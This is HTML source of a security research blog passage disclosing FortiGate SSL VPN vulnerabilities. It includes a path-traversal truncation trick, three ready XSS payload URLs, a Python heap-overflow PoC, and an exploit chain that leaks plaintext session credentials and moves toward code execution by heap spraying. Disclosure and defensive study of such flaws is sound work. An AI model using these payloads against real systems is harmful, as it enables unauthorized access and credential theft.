&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/migadmin/lang/%s.json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;There is no protection, but a file extension appended automatically. It seems like we can only read json file. However, actually we can abuse the feature of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt;. According to the man page, it writes &lt;strong&gt;at most size-1&lt;/strong&gt; into the output string. Therefore, we only need to make it exceed the buffer size and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.json&lt;/code&gt; will be stripped. Then we can read whatever we want.&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13380-pre-auth-xss&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-383&quot;&gt;CVE-2018-13380&lt;/a&gt;: Pre-auth XSS&lt;/h3&gt;
&lt;p&gt;There are several XSS:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/message?title=x&amp;amp;msg=%26%23&amp;lt;svg/onload=alert(1)&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cve-2018-13381-pre-auth-heap-overflow&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-387&quot;&gt;CVE-2018-13381&lt;/a&gt;: Pre-auth heap overflow&lt;/h3&gt;
&lt;p&gt;While encoding HTML entities code, there are 2 stages. The server first calculate the required buffer length for encoded string. Then it encode into the buffer. In the calculation stage, for example, encode string for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt; and this should occupies 5 bytes. If it encounter anything starts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#&lt;/code&gt;, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt;, it consider there is a token already encoded, and count its length directly. Like this:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;(&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;)&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;#&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;lt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;amp;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;#&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, there is an inconsistency between length calculation and encoding process. The encode part does not handle that much.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;lt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;#60;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;default:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we input a malicious string like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#&amp;lt;&amp;lt;&amp;lt;;&lt;/code&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; is still encoded into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt;, so the result should be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#&amp;amp;#60;&amp;amp;#60;&amp;amp;#60;;&lt;/code&gt;! This is much longer than the expected length 6 bytes, so it leads to a heap overflow.&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&apos;title&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;x&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&apos;msg&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&amp;amp;#&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&amp;lt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;;&amp;lt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;https://sslvpn:4433/message&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cve-2018-13382-the-magic-backdoor&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-389&quot;&gt;CVE-2018-13382&lt;/a&gt;: The magic backdoor&lt;/h3&gt;
&lt;p&gt;In the login page, we found a special parameter called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic&lt;/code&gt;. Once the parameter meets a hardcoded string, we can modify any userâ€™s password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;According to our survey, there are still plenty of Fortigate SSL VPN lack of patch. Therefore, considering its severity, we will not disclose the magic string. However, this vulnerability has been &lt;a href=&quot;https://twitter.com/codewhitesec/status/1145967317672714240&quot;&gt;reproduced by the researcher from CodeWhite&lt;/a&gt;. It is surely that other attackers will exploit this vulnerability soon! Please update your Fortigate ASAP!&lt;/p&gt;

&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;zh-tw&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Critical vulns in &lt;a href=&quot;https://twitter.com/hashtag/FortiOS?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#FortiOS&lt;/a&gt; reversed &amp;amp; exploited by our colleagues &lt;a href=&quot;https://twitter.com/niph_?ref_src=twsrc%5Etfw&quot;&gt;@niph_&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/ramoliks?ref_src=twsrc%5Etfw&quot;&gt;@ramoliks&lt;/a&gt; - patch your &lt;a href=&quot;https://twitter.com/hashtag/FortiOS?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#FortiOS&lt;/a&gt; asap and see the &lt;a href=&quot;https://twitter.com/hashtag/bh2019?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#bh2019&lt;/a&gt; talk of &lt;a href=&quot;https://twitter.com/orange_8361?ref_src=twsrc%5Etfw&quot;&gt;@orange_8361&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/mehqq_?ref_src=twsrc%5Etfw&quot;&gt;@mehqq_&lt;/a&gt; for details (tnx guys for the teaser that got us started) &lt;a href=&quot;https://t.co/TLLEbXKnJ4&quot;&gt;pic.twitter.com/TLLEbXKnJ4&lt;/a&gt;&lt;/p&gt;&amp;mdash; Code White GmbH (@codewhitesec) &lt;a href=&quot;https://twitter.com/codewhitesec/status/1145967317672714240?ref_src=twsrc%5Etfw&quot;&gt;2019å¹´7æœˆ2æ—¥&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async=&quot;&quot; src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;cve-2018-13383-post-auth-heap-overflow&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-388&quot;&gt;CVE-2018-13383&lt;/a&gt;: Post-auth heap overflow&lt;/h3&gt;

&lt;p&gt;This is a vulnerability on the WebVPN feature. While parsing JavaScript in the HTML, it tries to copy content into a buffer with the following code:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;js_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;js_buf_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The buffer size is fixed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2000&lt;/code&gt;, but the input string is unlimited. Therefore, here is a heap overflow. It is worth to note that this vulnerability can overflow Null byte, which is useful in our exploitation.
To trigger this overflow, we need to put our exploit on an HTTP server, and then ask the SSL VPN to proxy our exploit as a normal user.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;The official advisory described no RCE risk at first. Actually, it was a misunderstanding. We will show you how to exploit from the user login interface without authentication.&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13381&quot;&gt;CVE-2018-13381&lt;/h3&gt;
&lt;p&gt;Our first attempt is exploiting the pre-auth heap overflow. However, there is a fundamental defect of this vulnerability â€“ It does not overflow Null bytes. In general, this is not a serious problem. The heap exploitation techniques nowadays should overcome this. However, we found it a disaster doing heap feng shui on Fortigate. There are several obstacles, making the heap unstable and hard to be controlled.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Single thread, single process, single allocator
  The web daemon handles multiple connection with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;epoll()&lt;/code&gt;, no multi-process or multi-thread, and the main process and libraries use the same heap, called JeMalloc. It means, all the memory allocations from all the operations of all the connections are on the same heap. Therefore, the heap is really messy.&lt;/li&gt;
  &lt;li&gt;Operations regularly triggered
  This interferes the heap but is uncontrollable. We cannot arrange the heap carefully because it would be destroyed.&lt;/li&gt;
  &lt;li&gt;Apache additional memory management. 
  The memory wonâ€™t be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt; until the connection ends. We cannot arrange the heap in a single connection. Actually this can be an effective mitigation for heap vulnerabilities especially for use-after-free.&lt;/li&gt;
  &lt;li&gt;JeMalloc
  JeMalloc isolates meta data and user data, so it is hard to modify meta data and play with the heap management. Moreover, it centralizes small objects, which also limits our exploit.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We were stuck here, and then we chose to try another way. If anyone exploits this successfully, please teach us!&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13379--cve-2018-13383&quot;&gt;CVE-2018-13379 + CVE-2018-13383&lt;/h3&gt;
&lt;p&gt;This is a combination of pre-auth file reading and post-auth heap overflow. One for gaining authentication and one for getting a shell.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Gain authentication
  We first use CVE-2018-13379 to leak the session file. The session file contains valuable information, such as username and plaintext password, which let us login easily.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Get the shell
  After login, we can ask the SSL VPN to proxy the exploit on our malicious HTTP server, and then trigger the heap overflow.&lt;/p&gt;

    &lt;p&gt;Due to the problems mentioned above, we need a nice target to overflow. We cannot control the heap carefully, but maybe we can find something &lt;strong&gt;regularly&lt;/strong&gt; appears! It would be great if it is &lt;strong&gt;everywhere&lt;/strong&gt;, and every time we trigger the bug, we can overflow it easily! However, it is a hard work to find such a target from this huge program, so we were stuck at that time â€¦ and we started to fuzz the server, trying to get something useful.&lt;/p&gt;

    &lt;p&gt;We got an interesting crash. To our great surprise, we almost control the program counter!&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Here is the crash, and thatâ€™s why we love fuzzing! ;)&lt;/p&gt;
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Program received signal SIGSEGV, Segmentation fault.
  0x00007fb908d12a77 in SSL_do_handshake () from /fortidev4-x86_64/lib/libssl.so.1.1
  2: /x $rax = 0x41414141
  1: x/i $pc
  =&amp;gt; 0x7fb908d12a77 &amp;lt;SSL_do_handshake+23&amp;gt;: callq *0x60(%rax)
  (gdb)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;The crash happened in &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_lib.c#L3716&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL_do_handshake()&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SSL_do_handshake&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

      &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssl_renegotiate_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSL_in_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSL_in_before&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSL_MODE_ASYNC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ASYNC_get_current_job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_async_args&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

              &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

              &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_start_async_job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_do_handshake_intern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handshake_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;We overwrote the function table inside &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1080&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;struct SSL&lt;/code&gt;&lt;/a&gt; called &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1087&quot;&gt;method&lt;/a&gt;, so when the program trying to execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s-&amp;gt;method-&amp;gt;ssl_renegotiate_check(s, 0);&lt;/code&gt;, it crashed.&lt;/p&gt;

    &lt;p&gt;This is actually an ideal target of our exploit! The allocation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;struct SSL&lt;/code&gt; can be triggered easily, and the size is just close to our JaveScript buffer, so it can be nearby our buffer with a regular offset! According to the code, we can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret = s-&amp;gt;handshake_func(s);&lt;/code&gt; calls a function pointer, which a perfect choice to control the program flow. With this finding, our exploit strategy is clear.&lt;/p&gt;

    &lt;p&gt;We first &lt;strong&gt;spray&lt;/strong&gt; the heap with SSL structure with lots of normal requests, and then overflow the SSL structure.&lt;/p&gt;

